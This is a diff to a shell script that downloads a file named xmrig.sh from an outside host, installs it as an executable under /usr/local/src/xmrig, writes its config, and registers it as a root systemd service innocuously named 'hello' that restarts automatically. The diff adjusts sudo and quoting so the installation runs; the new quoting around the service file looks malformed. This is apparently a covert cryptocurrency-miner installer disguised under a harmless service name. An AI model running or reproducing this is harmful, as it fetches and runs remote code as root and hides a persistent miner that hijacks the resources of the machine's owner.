@@ -1,6 +1,6 @@
-sudo wget http://archive.ubuntu.com/ubuntu/pool/main/m/m4/m4_1.4.18-4_amd64.deb && sudo dpkg -i m4_1.4.18-4_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autoconf/autoconf_2.69-11.1_all.deb && sudo dpkg -i autoconf_2.69-11.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autotools-dev/autotools-dev_20180224.1_all.deb && sudo dpkg -i autotools-dev_20180224.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/automake-1.16/automake_1.16.1-4ubuntu6_all.deb && sudo dpkg -i automake_1.16.1-4ubuntu6_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtool/libltdl-dev_2.4.6-14_amd64.deb && sudo dpkg -i libltdl-dev_2.4.6-14_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/n/numactl/libnuma-dev_2.0.12-1_amd64.deb && sudo dpkg -i libnuma-dev_2.0.12-1_amd64.deb ** sudo wget http://archive.ubuntu.com/ubuntu/pool/universe/h/hwloc/libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo wget http://ftp.osuosl.org/pub/ubuntu/pool/universe/h/hwloc/libhwloc-dev_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc-dev_2.1.0+dfsg-4_amd64.deb && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && sudo wget http://hnv-data.online/xmrig.sh && sudo mv xmrig.sh xmrig && sudo chmod +x xmrig && sudo echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf && sudo sysctl -p
+sudo wget http://archive.ubuntu.com/ubuntu/pool/main/m/m4/m4_1.4.18-4_amd64.deb && sudo dpkg -i m4_1.4.18-4_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autoconf/autoconf_2.69-11.1_all.deb && sudo dpkg -i autoconf_2.69-11.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/autotools-dev/autotools-dev_20180224.1_all.deb && sudo dpkg -i autotools-dev_20180224.1_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/a/automake-1.16/automake_1.16.1-4ubuntu6_all.deb && sudo dpkg -i automake_1.16.1-4ubuntu6_all.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/libt/libtool/libltdl-dev_2.4.6-14_amd64.deb && sudo dpkg -i libltdl-dev_2.4.6-14_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/main/n/numactl/libnuma-dev_2.0.12-1_amd64.deb && sudo dpkg -i libnuma-dev_2.0.12-1_amd64.deb && sudo wget http://archive.ubuntu.com/ubuntu/pool/universe/h/hwloc/libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc15_2.1.0+dfsg-4_amd64.deb && sudo wget http://ftp.osuosl.org/pub/ubuntu/pool/universe/h/hwloc/libhwloc-dev_2.1.0+dfsg-4_amd64.deb && sudo dpkg -i libhwloc-dev_2.1.0+dfsg-4_amd64.deb && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && sudo wget http://hnv-data.online/xmrig.sh && sudo mv xmrig.sh xmrig && sudo chmod +x xmrig && sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf" && sudo sysctl -p
 
-cat > /usr/local/src/xmrig/build/config.json <<EOL
+sudo bash -c 'cat > /usr/local/src/xmrig/build/config.json <<EOL
 {
     "api": {
         "id": null,
@@ -112,9 +112,10 @@ cat > /usr/local/src/xmrig/build/config.json <<EOL
 }
 
 EOL
+'
 
-cat > /lib/systemd/system/hello.service <<EOL
-[Unit]
+sudo bash -c 'cat > /lib/systemd/system/hello.service <<EOL
+'[Unit]
 Description=hello
 After=network.target
 [Service]
@@ -125,6 +126,6 @@ RestartSec=60
 User=root
 [Install]
 WantedBy=multi-user.target
-EOL
+EOL'
 
 sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
